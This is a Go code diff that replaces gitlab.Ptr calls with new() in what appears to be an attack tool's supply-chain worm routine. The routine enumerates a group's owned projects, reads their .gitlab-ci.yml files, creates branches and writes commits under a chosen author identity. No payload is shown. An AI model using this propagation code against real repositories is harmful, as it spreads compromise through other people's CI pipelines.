@@ -308,8 +308,8 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 	page := int64(1)
 	for {
 		projOpts := &gitlab.ListProjectsOptions{
-			Search: gitlab.Ptr(groupPath),
-			Owned:  gitlab.Ptr(true),
+			Search: new(groupPath),
+			Owned:  new(true),
 			ListOptions: gitlab.ListOptions{
 				PerPage: 100,
 				Page:    page,
@@ -341,7 +341,7 @@ func RunSupplyChainWorm(ctx context.Context, client *gitlab.Client, targetProjec
 		// Try to fetch existing CI file
 		f, _, ferr := client.RepositoryFiles.GetFile(
 			sibID, ".gitlab-ci.yml",
-			&gitlab.GetFileOptions{Ref: gitlab.Ptr("main")},
+			&gitlab.GetFileOptions{Ref: new("main")},
 			gitlab.WithContext(ctx),
 		)
 		if ferr == nil && f != nil {
@@ -405,8 +405,8 @@ func (a *wormAttacker) EnsureBranch(ctx context.Context, projectID any, branch s
 	}
 	if resp != nil && resp.StatusCode == 404 {
 		createOpts := &gitlab.CreateBranchOptions{
-			Ref:    gitlab.Ptr("main"),
-			Branch: gitlab.Ptr(branch),
+			Ref:    new("main"),
+			Branch: new(branch),
 		}
 		_, _, err := a.client.Branches.CreateBranch(projectID, createOpts, gitlab.WithContext(ctx))
 		return err
@@ -417,29 +417,29 @@ func (a *wormAttacker) EnsureBranch(ctx context.Context, projectID any, branch s
 func (a *wormAttacker) UpsertFile(ctx context.Context, projectID any, branch, filePath, content, message string) error {
 	f, _, err := a.client.RepositoryFiles.GetFile(
 		projectID, filePath,
-		&gitlab.GetFileOptions{Ref: gitlab.Ptr(branch)},
+		&gitlab.GetFileOptions{Ref: new(branch)},
 		gitlab.WithContext(ctx),
 	)
 	if err != nil {
 		// File doesn't exist — create it
 		createOpts := &gitlab.CreateFileOptions{
-			Branch:        gitlab.Ptr(branch),
-			Content:       gitlab.Ptr(content),
-			CommitMessage: gitlab.Ptr(message),
-			AuthorName:    gitlab.Ptr(a.authorName),
-			AuthorEmail:   gitlab.Ptr(a.authorEmail),
+			Branch:        new(branch),
+			Content:       new(content),
+			CommitMessage: new(message),
+			AuthorName:    new(a.authorName),
+			AuthorEmail:   new(a.authorEmail),
 		}
 		_, _, err := a.client.RepositoryFiles.CreateFile(projectID, filePath, createOpts, gitlab.WithContext(ctx))
 		return err
 	}
 	// File exists — update it
 	updateOpts := &gitlab.UpdateFileOptions{
-		Branch:        gitlab.Ptr(branch),
-		Content:       gitlab.Ptr(content),
-		CommitMessage: gitlab.Ptr(message),
-		AuthorName:    gitlab.Ptr(a.authorName),
-		AuthorEmail:   gitlab.Ptr(a.authorEmail),
-		LastCommitID:  gitlab.Ptr(f.CommitID),
+		Branch:        new(branch),
+		Content:       new(content),
+		CommitMessage: new(message),
+		AuthorName:    new(a.authorName),
+		AuthorEmail:   new(a.authorEmail),
+		LastCommitID:  new(f.CommitID),
 	}
 	_, _, err = a.client.RepositoryFiles.UpdateFile(projectID, filePath, updateOpts, gitlab.WithContext(ctx))
 	return err
